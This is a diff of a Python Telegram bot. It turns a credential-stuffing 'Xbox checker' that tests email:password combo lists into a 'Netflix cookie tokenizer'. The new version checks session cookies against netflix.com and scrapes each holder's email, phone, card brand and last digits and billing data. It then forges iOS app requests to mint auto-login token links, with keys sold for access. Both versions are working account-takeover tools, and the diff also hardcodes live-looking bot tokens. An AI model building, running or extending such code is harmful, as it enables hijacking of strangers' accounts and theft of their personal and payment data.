@@ -1,46 +1,72 @@
 import os
-import sqlite3
+import re
+import json
 import random
+import time
+import sqlite3
 import string
 import asyncio
-import time
+import urllib3
+import urllib.parse
 from datetime import datetime, timedelta
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
-from telegram.ext import ApplicationBuilder, MessageHandler, CallbackQueryHandler, CommandHandler, ContextTypes, filters
-from xbox.webapi.api.client import XboxLiveClient
-from xbox.webapi.authentication.manager import AuthenticationManager
-import httpx
-from colorama import init, Fore
+import requests
 
-init(autoreset=True)
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    MessageHandler,
+    CallbackQueryHandler,
+    ContextTypes,
+    filters,
+)
+
+# Disable SSL warnings and initialize
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # CONFIGURATION
-TELEGRAM_BOT_TOKEN = "8658943714:AAEFCKM5eEzjrQSI4rUDH4dndRRQKmh36c4"
+TELEGRAM_BOT_TOKEN = "8597687291:AAGoa2PQL6glLjyT2Tb-qH8MXRm9h_8jutc"
 OWNER_HANDLE = "@kudsoo"
+
+# MANDATORY CHATS TO JOIN
+REQUIRED_CHANNEL = "@kudsiontop"
+CHANNEL_LINK = "https://t.me/kudsiontop"
+
+REQUIRED_GROUP = "@kudaisimpressed"
+GROUP_LINK = "https://t.me/kudaisimpressed"
+
 ADMIN_IDS = [8511482382]  # Your Admin Telegram ID
-OUTPUT_DIR = "results_output"
 
-os.makedirs(OUTPUT_DIR, exist_ok=True)
+# ==================== DATABASE SETUP (SINGLE CONNECTION THREAD) ====================
+DB_NAME = "netflix_bot.db"
 
-# DATABASE INITIALIZATION
+def get_db():
+    conn = sqlite3.connect(DB_NAME, check_same_thread=False)
+    conn.row_factory = sqlite3.Row
+    return conn
+
 def init_db():
-    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
+    conn = get_db()
     cursor = conn.cursor()
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY,
             username TEXT,
-            is_admin INTEGER DEFAULT 0,
-            is_banned INTEGER DEFAULT 0,
-            expiry TEXT
+            checks_count INTEGER DEFAULT 0,
+            is_premium INTEGER DEFAULT 0,
+            premium_expires TEXT,
+            waiting_for_key INTEGER DEFAULT 0,
+            waiting_for_broadcast INTEGER DEFAULT 0
         )
     """)
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS keys (
-            key TEXT PRIMARY KEY,
-            duration_hours INTEGER,
+            code TEXT PRIMARY KEY,
+            duration_text TEXT,
+            duration_seconds INTEGER,
             is_redeemed INTEGER DEFAULT 0,
-            redeemed_by INTEGER
+            redeemed_by INTEGER,
+            created_at TEXT
         )
     """)
     conn.commit()
@@ -49,292 +75,395 @@ def init_db():
 init_db()
 
 def db_query(query, params=(), fetch=None):
-    conn = sqlite3.connect("bot_database.db", check_same_thread=False)
+    conn = get_db()
     cursor = conn.cursor()
-    cursor.execute(query, params)
-    result = None
-    if fetch == "one":
-        result = cursor.fetchone()
-    elif fetch == "all":
-        result = cursor.fetchall()
-    conn.commit()
-    conn.close()
-    return result
+    try:
+        cursor.execute(query, params)
+        result = None
+        if fetch == "one":
+            row = cursor.fetchone()
+            result = dict(row) if row else None
+        elif fetch == "all":
+            result = [dict(row) for row in cursor.fetchall()]
+        conn.commit()
+        return result
+    except Exception as e:
+        print(f"[-] DB Error: {e} | Query: {query}")
+        return None
+    finally:
+        conn.close()
 
-# STATS TRACKER
-bot_stats = {
-    "total_processed": 0,
-    "successful": 0,
-    "failed": 0,
-    "giveaway_active": False,
-    "channel_linked": "Not Set"
+def parse_duration(dur_str):
+    dur_str = dur_str.strip().lower()
+    if dur_str in ["lifetime", "life", "inf"]:
+        return "Lifetime", 9999999999
+    
+    match = re.match(r"^(\d+)([mhdy])$", dur_str)
+    if not match:
+        return None, None
+    
+    val, unit = int(match.group(1)), match.group(2)
+    if unit == "m":
+        return f"{val} Minute(s)", val * 60
+    elif unit == "h":
+        return f"{val} Hour(s)", val * 3600
+    elif unit == "d":
+        return f"{val} Day(s)", val * 86400
+    elif unit == "y":
+        return f"{val} Year(s)", val * 31536000
+    return None, None
+
+def check_user_premium(user_id):
+    if user_id in ADMIN_IDS:
+        return True
+    user = db_query("SELECT is_premium, premium_expires FROM users WHERE user_id=?", (user_id,), "one")
+    if not user:
+        return False
+    is_prem, expires = user["is_premium"], user["premium_expires"]
+    if not is_prem:
+        return False
+    if expires == "Lifetime":
+        return True
+    try:
+        exp_dt = datetime.fromisoformat(expires)
+        if datetime.now() > exp_dt:
+            db_query("UPDATE users SET is_premium=0, premium_expires=NULL WHERE user_id=?", (user_id,))
+            return False
+        return True
+    except Exception:
+        return False
+
+async def check_memberships(bot, user_id):
+    if user_id in ADMIN_IDS:
+        return True, True
+    
+    is_channel_joined = True
+    is_group_joined = True
+
+    try:
+        member_ch = await bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
+        if member_ch.status not in ["creator", "administrator", "member"]:
+            is_channel_joined = False
+    except Exception:
+        pass
+
+    try:
+        member_gp = await bot.get_chat_member(chat_id=REQUIRED_GROUP, user_id=user_id)
+        if member_gp.status not in ["creator", "administrator", "member", "restricted"]:
+            is_group_joined = False
+    except Exception:
+        pass
+
+    return is_channel_joined, is_group_joined
+
+# ==================== NETFLIX SCRAPER & TOKENIZER ====================
+
+UA_WEB = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+    "AppleWebKit/537.36 (KHTML, like Gecko) "
+    "Chrome/131.0.0.0 Safari/537.36"
+)
+
+COUNTRY_FLAGS = {
+    "US":"🇺🇸","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","ES":"🇪🇸","IT":"🇮🇹",
+    "TR":"🇹🇷","BR":"🇧🇷","JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","CA":"🇨🇦",
+    "AU":"🇦🇺","MX":"🇲🇽","NL":"🇳🇱","SE":"🇸🇪","NO":"🇳🇴","DK":"🇩🇰",
+    "FI":"🇫🇮","PL":"🇵🇱","RU":"🇷🇺","AR":"🇦🇷","CL":"🇨🇱","CO":"🇨🇴",
+    "PE":"🇵🇪","AE":"🇦🇪","SA":"🇸🇦","EG":"🇪🇬","ZA":"🇿🇦","ID":"🇮🇩",
+    "MY":"🇲🇾","SG":"🇸🇬","TH":"🇹🇭","VN":"🇻🇳","PH":"🇵🇭","KE":"🇰🇪",
+    "NG":"🇳🇬","GH":"🇬🇭","PT":"🇵🇹","RO":"🇷🇴","HU":"🇭🇺","CZ":"🇨🇿",
+    "UA":"🇺🇦","AT":"🇦🇹","CH":"🇨🇭","BE":"🇧🇪","IL":"🇮🇱","TW":"🇹🇼",
+    "HK":"🇭🇰","PK":"🇵🇰","BO":"🇧🇴","GT":"🇬🇹","EC":"🇨🇦","UY":"🇺🇾",
+    "NZ":"🇳🇿","ZW":"🇿🇼","SK":"🇸🇰","HR":"🇭🇷","RS":"🇷🇸","BG":"🇧🇬",
+}
+COUNTRY_NAMES = {
+    "US":"United States","GB":"United Kingdom","DE":"Germany","FR":"France",
+    "ES":"Spain","IT":"Italy","TR":"Turkey","BR":"Brazil","JP":"Japan",
+    "KR":"South Korea","IN":"India","CA":"Canada","AU":"Australia","MX":"Mexico",
+    "NL":"Netherlands","SE":"Sweden","NO":"Norway","DK":"Denmark","FI":"Finland",
+    "PL":"Poland","RU":"Russia","AR":"Argentina","CL":"Chile","CO":"Colombia",
+    "PE":"Peru","AE":"UAE","SA":"Saudi Arabia","EG":"Egypt","ZA":"South Africa",
+    "ID":"Indonesia","MY":"Malaysia","SG":"Singapore","TH":"Thailand","VN":"Vietnam",
+    "PH":"Philippines","KE":"Kenya","NG":"Nigeria","GH":"Ghana","PT":"Portugal",
+    "RO":"Romania","HU":"Hungary","CZ":"Czech Republic","UA":"Ukraine",
+    "AT":"Austria","CH":"Switzerland","BE":"Belgium","IL":"Israel","TW":"Taiwan",
+    "HK":"Hong Kong","PK":"Pakistan","NZ":"New Zealand","SK":"Slovakia",
+    "HR":"Croatia","RS":"Serbia","BG":"Bulgaria",
 }
 
-print(Fore.RED + "==================================================")
-print(Fore.RED + " [KUDASAI] LIVE PROGRESS BAR CHECKER ONLINE")
-print(Fore.RED + "==================================================\n")
+def _djs(s):
+    if not s:
+        return ""
+    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
+    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
+    return s.strip()
 
-def log_to_file(filename, content):
-    try:
-        file_path = os.path.join(OUTPUT_DIR, filename)
-        with open(file_path, "a", encoding="utf-8") as f:
-            f.write(content + "\n")
-    except Exception as e:
-        print(Fore.RED + f"[-] Error writing to {filename}: {str(e)}")
+def _rx(pattern, text, default=""):
+    m = re.search(pattern, text, re.S)
+    return m.group(1) if m else default
 
-def generate_progress_bar(current, total, length=10):
-    if total == 0:
-        filled = 0
-    else:
-        filled = int(round(length * current / float(total)))
-    bar = '█' * filled + '░' * (length - filled)
-    percentage = int(round((current / float(total)) * 100)) if total > 0 else 0
-    return f"[{bar}] {percentage}% ({current}/{total})"
+def _rx_all(pattern, text):
+    return re.findall(pattern, text, re.S)
 
-async def process_accounts_with_progress(account_lines, chat_id, context: ContextTypes.DEFAULT_TYPE):
-    for file in ["results.txt", "2fa.txt", "errors.txt"]:
-        fp = os.path.join(OUTPUT_DIR, file)
-        if os.path.exists(fp):
-            os.remove(fp)
+def _flag(cc):
+    return COUNTRY_FLAGS.get((cc or "").upper(), "🌍")
 
-    valid_accounts = []
-    for line in account_lines:
+def _country(cc):
+    return COUNTRY_NAMES.get((cc or "").upper(), cc or "Unknown")
+
+def load_cookies(text):
+    text = text.strip()
+    if text.startswith("[") or text.startswith("{"):
+        try:
+            data = json.loads(text)
+            if isinstance(data, list):
+                return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
+            if isinstance(data, dict):
+                return data
+        except Exception:
+            pass
+    
+    cookies = {}
+    for line in text.splitlines():
         line = line.strip()
         if not line or line.startswith("#"):
             continue
-        if ":" in line and "@" in line:
-            parts = line.split(":")
-            if len(parts) >= 2:
-                email = parts[0].strip()
-                password = parts[1].strip().split(" ")[0].split("\t")[0]
-                valid_accounts.append((email, password))
+        parts = re.split(r'\s+', line, maxsplit=6)
+        if len(parts) >= 7:
+            cookies[parts[5].strip()] = parts[6].strip()
+            
+    if cookies:
+        return cookies
 
-    total = len(valid_accounts)
-    if total == 0:
-        await context.bot.send_message(chat_id=chat_id, text="❌ **[KUDASAI]** No valid `email:password` accounts detected in your input file.")
-        return
+    for part in re.split(r"[;\n]", text):
+        part = part.strip()
+        if "=" in part:
+            k, _, v = part.partition("=")
+            k, v = k.strip(), v.strip()
+            if k:
+                cookies[k] = v
+    return cookies
 
-    # Send initial progress message
-    status_msg = await context.bot.send_message(
-        chat_id=chat_id,
-        text=f"🚀 **[KUDASAI] XBOX CHECKER INITIALIZED**\n\n"
-             f"📊 Progress: `[░░░░░░░░░░] 0% (0/{total})`\n"
-             f"🎯 Hits Found: 0\n"
-             f"⏳ Current: Starting up..."
-    )
+_IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
+_IOS_PARAMS = {
+    "appVersion": "15.48.1",
+    "config": ('{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false",'
+               '"cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true",'
+               '"billboardEnabled":"true","sharksEnabled":"true",'
+               '"useCDSGalleryEnabled":"true","avifFormatEnabled":"false"}'),
+    "device_type": "NFAPPL-02-",
+    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+    "idiom": "phone",
+    "iosVersion": "15.8.5",
+    "isTablet": "false",
+    "languages": "en-US",
+    "locale": "en-US",
+    "maxDeviceWidth": "375",
+    "model": "saget",
+    "modelType": "IPHONE8-1",
+    "odpAware": "true",
+    "path": '["account","token","default"]',
+    "pathFormat": "graph",
+    "pixelDensity": "2.0",
+    "progressive": "false",
+    "responseFormat": "json",
+}
+_IOS_HEADERS = {
+    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
+    "x-netflix.request.attempt": "1",
+    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
+    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
+    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
+    "x-netflix.context.app-version": "15.48.1",
+    "x-netflix.argo.translated": "true",
+    "x-netflix.context.form-factor": "phone",
+    "x-netflix.context.sdk-version": "2012.4",
+    "x-netflix.client.appversion": "15.48.1",
+    "x-netflix.context.max-device-width": "375",
+    "x-netflix.context.ab-tests": "",
+    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
+    "x-netflix.client.type": "argo",
+    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+    "x-netflix.context.locales": "en-US",
+    "x-netflix.argo.abtests": "",
+    "x-netflix.context.os-version": "15.8.5",
+    "x-netflix.request.client.context": '{"appState":"foreground"}',
+    "x-netflix.context.ui-flavor": "argo",
+    "x-netflix.argo.nfnsm": "9",
+    "x-netflix.context.pixel-density": "2.0",
+    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
+    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
+}
 
-    start_time = time.time()
-    hits = 0
-    processed = 0
+def generate_nftoken(netflix_id_raw, timeout=15):
+    if not netflix_id_raw:
+        return None
+    netflix_id = urllib.parse.unquote(str(netflix_id_raw))
+    headers = dict(_IOS_HEADERS)
+    headers["Cookie"] = f"NetflixId={netflix_id}"
 
-    async with httpx.AsyncClient() as client_http:
-        for email, password in valid_accounts:
-            processed += 1
-            bot_stats["total_processed"] += 1
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    try:
+        r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=headers, timeout=timeout, verify=False)
+        if r.status_code == 200:
+            data = r.json()
+            tok = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default", {}).get("token")
+            if tok:
+                return str(tok)
+    except Exception:
+        pass
+    return None
 
-            # Update live progress bar every 1 account or block
-            progress_str = generate_progress_bar(processed, total)
-            try:
-                await status_msg.edit_text(
-                    text=f"🚀 **[KUDASAI] CHECKING IN PROGRESS**\n\n"
-                         f"📊 Progress: `{progress_str}`\n"
-                         f"🎯 Hits Found: {hits}\n"
-                         f"📧 Checking: `{email}`",
-                    parse_mode="Markdown"
-                )
-            except Exception:
-                pass
+def check_account(cookies: dict, timeout=20):
+    if not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
+        return None
 
-            try:
-                auth_mgr = AuthenticationManager(client_http, client_id="", client_secret="", redirect_uri="")
-                await auth_mgr.authenticate(email, password)
-                
-                if not auth_mgr.authenticated:
-                    bot_stats["failed"] += 1
-                    log_to_file("errors.txt", f"[{timestamp}] REJECTED: {email}:{password}")
-                    continue
+    sess = requests.Session()
+    sess.headers.update({
+        "User-Agent": UA_WEB,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "DNT": "1",
+    })
+    for k, v in cookies.items():
+        sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
 
-                xbl_client = XboxLiveClient(
-                    userhash=auth_mgr.userinfo.userhash,
-                    auth_token=auth_mgr.xsts_token.jwt,
-                    xuid=auth_mgr.userinfo.xuid
-                )
-                
-                profile_resp = await xbl_client.profile.get_profile_by_xuid(auth_mgr.userinfo.xuid)
-                gamertag = "Unknown"
-                if profile_resp and 'profileUsers' in profile_resp:
-                    for user in profile_resp['profileUsers']:
-                        for setting in user.get('settings', []):
-                            if setting['id'] == 'GameDisplayName':
-                                gamertag = setting['value']
+    try:
+        r = sess.get("https://www.netflix.com/account", allow_redirects=True, timeout=timeout)
+    except requests.RequestException:
+        return None
 
-                hits += 1
-                bot_stats["successful"] += 1
+    if "login" in r.url.lower() or r.status_code in (401, 403):
+        return None
 
-                result_block = f"--- [{timestamp}] SUCCESS ---\n"
-                result_block += f"Email: {email}\n"
-                result_block += f"Password: {password}\n"
-                result_block += f"Gamertag: {gamertag}\n"
-                result_block += f"XUID: {auth_mgr.userinfo.xuid}\n"
+    html = r.text
+    if '"membershipStatus":"CURRENT_MEMBER"' not in html:
+        return None
 
-                try:
-                    titles_resp = await xbl_client.titlehub.get_title_history(auth_mgr.userinfo.xuid)
-                    result_block += "Owned / Recent Games:\n"
-                    if titles_resp and 'titles' in titles_resp:
-                        for title in titles_resp['titles'][:15]:
-                            result_block += f"  - {title.get('name', 'Unknown Title')} ({title.get('type', 'Unknown')})\n"
-                    else:
-                        result_block += "  - No public game history found.\n"
-                except Exception:
-                    pass
+    email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
+    name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html)) or _djs(_rx(r'"firstName":"([^"]+)"', html))
+    cc = _rx(r'"countryOfSignup":"([A-Z]{2,3})"', html, "XX")
+    plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
+    price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))
+    since = _djs(_rx(r'"memberSince":"([^"]+)"', html))
+    nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))
+    q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html).upper()
+    quality = {"UHD": "UHD 4K", "FHD": "FHD 1080p", "HD": "HD 720p", "SD": "SD 480p"}.get(q_raw, q_raw or "N/A")
+    streams = _rx(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html, "N/A")
 
-                result_block += "=" * 40 + "\n"
-                log_to_file("results.txt", result_block)
+    _pm_start = html.find('"paymentMethods"')
+    pm_raw = html[_pm_start:_pm_start + 3000] if _pm_start >= 0 else ""
+    card_brand = _rx(r'"paymentOptionLogo":"([^"]+)"', pm_raw) or _rx(r'"type":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
+    pay_type = _rx(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
+    card_last4 = _rx(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"', pm_raw) or _rx(r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
+    phone = _djs(_rx(r'"phoneNumber":"([^"]*)"', html)) or "N/A"
+    phone_verified = _rx(r'"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)', html) == "true"
+    extra_slots = int(_rx(r'"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}', html, "0") or 0)
+    free_trial = '"isInFreeTrial":true' in html
 
-            except Exception as e:
-                bot_stats["failed"] += 1
-                error_message = str(e).lower()
-                if any(k in error_message for k in ["mfa", "2fa", "twofactor", "proof", "challenge", "captcha"]):
-                    log_to_file("2fa.txt", f"[{timestamp}] 2FA_REQUIRED: {email}:{password}")
-                else:
-                    log_to_file("errors.txt", f"[{timestamp}] ERROR: {email}:{password}")
+    profiles = [_djs(p) for p in _rx_all(r'"profileName":"([^"]+)"', html)]
+    seen, profiles_clean = set(), []
+    for p in profiles:
+        if p and p not in seen:
+            seen.add(p)
+            profiles_clean.append(p)
 
-    elapsed = round(time.time() - start_time, 2)
+    netflix_id_raw = cookies.get("NetflixId", "")
+    tok = generate_nftoken(netflix_id_raw, timeout) if netflix_id_raw else None
     
-    # Finalize progress status message
-    await status_msg.edit_text(
-        text=f"✅ **[KUDASAI] SCAN COMPLETED!**\n\n"
-             f"📊 Total Checked: {total}\n"
-             f"🎯 Hits Found: {hits}\n"
-             f"⏱️ Time Taken: {elapsed} seconds\n\n"
-             f"📁 Uploading reports...",
-        parse_mode="Markdown"
-    )
+    if tok:
+        tok_safe = urllib.parse.quote(tok, safe="")
+        login_pc = f"https://netflix.com/?nftoken={tok_safe}"
+        login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
+    else:
+        login_pc = "https://www.netflix.com/browse"
+        login_phone = "https://www.netflix.com/browse"
+        
+    login_tv = "https://www.netflix.com/tv2"
 
-    # Upload files back to user chat
-    for filename in ["results.txt", "2fa.txt", "errors.txt"]:
-        file_path = os.path.join(OUTPUT_DIR, filename)
-        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
-            with open(file_path, "rb") as f:
-                await context.bot.send_document(chat_id=chat_id, document=f, caption=f"📁 Report: {filename}")
-            try:
-                os.remove(file_path)
-            except Exception:
-                pass
-        else:
-            if os.path.exists(file_path):
-                os.remove(file_path)
+    return {
+        "email": email or "N/A",
+        "name": name or (profiles_clean[0] if profiles_clean else "N/A"),
+        "country_code": cc,
+        "country": _country(cc),
+        "plan": plan or "N/A",
+        "price": price or "N/A",
+        "member_since": since or "N/A",
+        "next_billing": nextbill or "N/A",
+        "free_trial": free_trial,
+        "video_quality": quality,
+        "max_streams": str(streams),
+        "extra_slots": extra_slots,
+        "card_brand": card_brand or "N/A",
+        "card_last4": card_last4 or "N/A",
+        "payment_method": pay_type or "N/A",
+        "phone": phone,
+        "phone_verified": phone_verified,
+        "profiles": profiles_clean,
+        "profile_count": len(profiles_clean),
+        "netflix_id_raw": netflix_id_raw,
+        "login_pc": login_pc,
+        "login_phone": login_phone,
+        "login_tv": login_tv,
+    }
+
+# ==================== TELEGRAM BOT INTERFACE ====================
 
 def get_main_menu(user_id):
-    is_admin = user_id in ADMIN_IDS or db_query("SELECT is_admin FROM users WHERE user_id=?", (user_id,), "one")
-    if is_admin and type(is_admin) is tuple:
-        is_admin = is_admin[0]
-
+    is_admin = user_id in ADMIN_IDS
     keyboard = [
-        [InlineKeyboardButton("🚀 Start Checker", callback_data="start_checker"), InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem_prompt")],
-        [InlineKeyboardButton("🌐 Set Proxy", callback_data="set_proxy"), InlineKeyboardButton("📊 Statistics", callback_data="stats")]
+        [InlineKeyboardButton("🍪 Check Netflix Cookie", callback_data="check_prompt"), InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem_prompt")],
+        [InlineKeyboardButton("📊 My Account Status", callback_data="check_status"), InlineKeyboardButton("📖 Guide", callback_data="guide")]
     ]
     if is_admin:
         keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
     return InlineKeyboardMarkup(keyboard)
 
-def get_admin_panel_keyboard():
-    keyboard = [
-        [InlineKeyboardButton("👥 View Users", callback_data="adm_view_users"), InlineKeyboardButton("📊 View Stats", callback_data="adm_view_stats")],
-        [InlineKeyboardButton("🔑 1H", callback_data="gen_1h"), InlineKeyboardButton("🔑 3H", callback_data="gen_3h"), InlineKeyboardButton("🔑 7H", callback_data="gen_7h"), InlineKeyboardButton("🔑 10H", callback_data="gen_10h")],
-        [InlineKeyboardButton("⏳ Custom Days", callback_data="adm_custom_days"), InlineKeyboardButton("📦 Bulk Gen", callback_data="adm_bulk_gen")],
-        [InlineKeyboardButton("➕ Add Premium", callback_data="adm_add_prem"), InlineKeyboardButton("📋 List Users", callback_data="adm_list_users")],
-        [InlineKeyboardButton("🔕 Ban User", callback_data="adm_ban"), InlineKeyboardButton("✅ Unban User", callback_data="adm_unban")],
-        [InlineKeyboardButton("👑 Make Admin", callback_data="adm_make_admin"), InlineKeyboardButton("👤 Remove Admin", callback_data="adm_rem_admin")],
-        [InlineKeyboardButton("📬 Unused Keys", callback_data="adm_unused_keys"), InlineKeyboardButton("🗑️ Del Unused", callback_data="adm_del_unused")],
-        [InlineKeyboardButton("🔒 Redeemed Keys", callback_data="adm_redeemed_keys"), InlineKeyboardButton("🗑️ Delete Redeemed", callback_data="adm_del_redeemed")],
-        [InlineKeyboardButton("🧹 Delete All Keys", callback_data="adm_del_all_keys"), InlineKeyboardButton("🎁 Start Giveaway", callback_data="adm_start_giveaway")],
-        [InlineKeyboardButton("🛑 End Giveaway", callback_data="adm_end_giveaway"), InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast")],
-        [InlineKeyboardButton("📋 Queue Status", callback_data="adm_queue_status"), InlineKeyboardButton("📢 Channel Settings", callback_data="adm_channel_settings")],
-        [InlineKeyboardButton("🔙 Back to Main", callback_data="main_menu")]
-    ]
-    return InlineKeyboardMarkup(keyboard)
+def get_join_menu():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK)],
+        [InlineKeyboardButton("👥 Join Group", url=GROUP_LINK)],
+        [InlineKeyboardButton("🔄 Check Memberships", callback_data="check_membership")]
+    ])
 
 async def set_bot_commands(application):
     commands = [
-        BotCommand("start", "Open Kudasai main menu & dashboard"),
-        BotCommand("redeem", "Redeem a premium subscription key (Usage: /redeem <KEY>)"),
-        BotCommand("help", "Display help guide and instructions"),
-        BotCommand("stats", "Check live system checking metrics"),
-        BotCommand("admin", "Open Admin Control Panel (Admins Only)")
+        BotCommand("start", "Open main menu"),
+        BotCommand("stats", "Check your membership status"),
+        BotCommand("redeem", "Redeem key (/redeem <key>)"),
+        BotCommand("admin", "Open admin panel (Admin only)")
     ]
     await application.bot.set_my_commands(commands)
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    db_query("INSERT OR IGNORE INTO users (user_id, username, expiry) VALUES (?, ?, ?)", (user.id, user.username or "Unknown", datetime.now().isoformat()))
-    
-    user_data = db_query("SELECT is_banned, expiry FROM users WHERE user_id=?", (user.id,), "one")
-    if user_data and len(user_data) >= 2 and user_data[0] == 1:
+    db_query("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user.id, user.username or "Unknown"))
+    db_query("UPDATE users SET waiting_for_key=0 WHERE user_id=?", (user.id,))
+
+    is_ch, is_gp = await check_memberships(context.bot, user.id)
+    if not is_ch or not is_gp:
+        join_text = (
+            "🔒 **Channel & Group Subscription Required!**\n\n"
+            f"To use this bot, you must join both our official channel and group first:\n"
+            f"• Channel: {REQUIRED_CHANNEL}\n"
+            f"• Group: {REQUIRED_GROUP}\n\n"
+            "Click the buttons below to join, then click **Check Memberships**."
+        )
         if update.message:
-            await update.message.reply_text("❌ You are banned from using this bot.")
+            await update.message.reply_text(join_text, parse_mode="Markdown", reply_markup=get_join_menu())
+        elif update.callback_query:
+            await update.callback_query.message.edit_text(join_text, parse_mode="Markdown", reply_markup=get_join_menu())
         return
 
-    expiry_str = user_data[1] if user_data and len(user_data) >= 2 else datetime.now().isoformat()
-    expiry_dt = datetime.fromisoformat(expiry_str)
-    has_access = expiry_dt > datetime.now() or user.id in ADMIN_IDS
-    access_status = f"✅ Active until {expiry_dt.strftime('%m-%d %H:%M')}" if has_access else "❌ No Active Key | Use /redeem"
-
-    gui_text = (
-        "✨ **Welcome to** ✨ **KUDASAI XBOX CHECKER!**\n"
-        "╔═══════════════════════════════════════\n"
-        f"║ 🕹️ Xbox Account Checker\n"
-        f"║ ℹ️ Version: v2.0\n"
-        f"║ 👑 Owner: {OWNER_HANDLE}\n"
-        "╠═══════════════════════════════════════\n"
-        f"║ 🔒 Access: {access_status}\n"
-        f"║ 📊 Total Checks: {bot_stats['total_processed']}\n"
-        f"║ 🎯 Hits Found: {bot_stats['successful']}\n"
-        f"║ 🌐 Proxy: None | 0 loaded\n"
-        "╚═══════════════════════════════════════\n\n"
-        "📋 **Queue System:** All checks go through queue\n"
-        "👑 **Admins get priority** - Always at front!\n"
-        "🌐 **Proxy System:** Each user has their OWN proxy settings!\n\n"
-        "Use the buttons below to get started!"
+    welcome_text = (
+        "🌟 **Welcome to Kudasai Netflix Tokenizer Bot!** 🌟\n\n"
+        "Convert Netscape cookies into instant auto-login tokens for **PC**, **Phone**, and **TV**.\n\n"
+        f"👑 **Developer:** {OWNER_HANDLE}"
     )
 
     if update.message:
-        await update.message.reply_text(gui_text, parse_mode="Markdown", reply_markup=get_main_menu(user.id))
+        await update.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=get_main_menu(user.id))
     elif update.callback_query:
-        await update.callback_query.message.edit_text(gui_text, parse_mode="Markdown", reply_markup=get_main_menu(user.id))
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    help_text = (
-        "🤖 **Kudasai Xbox Checker - Help Menu**\n\n"
-        "• `/start` - Launches the main dashboard interface.\n"
-        "• `/redeem <KEY>` - Unlocks premium access using a license key.\n"
-        "• `/stats` - Displays global checker metrics and success rates.\n"
-        "• `/admin` - Opens the Admin Control Panel (restricted access).\n\n"
-        "📌 **How to Check:** Simply send an account list in `email:password` format or upload a `.txt` file."
-    )
-    await update.message.reply_text(help_text, parse_mode="Markdown")
-
-async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    total_p = bot_stats["total_processed"]
-    success = bot_stats["successful"]
-    failed = bot_stats["failed"]
-    rate = f"{(success / total_p * 100):.1f}%" if total_p > 0 else "0.0%"
-    stats_text = (
-        f"📈 **Live Bot Statistics:**\n"
-        f"• Total Processed: {total_p}\n"
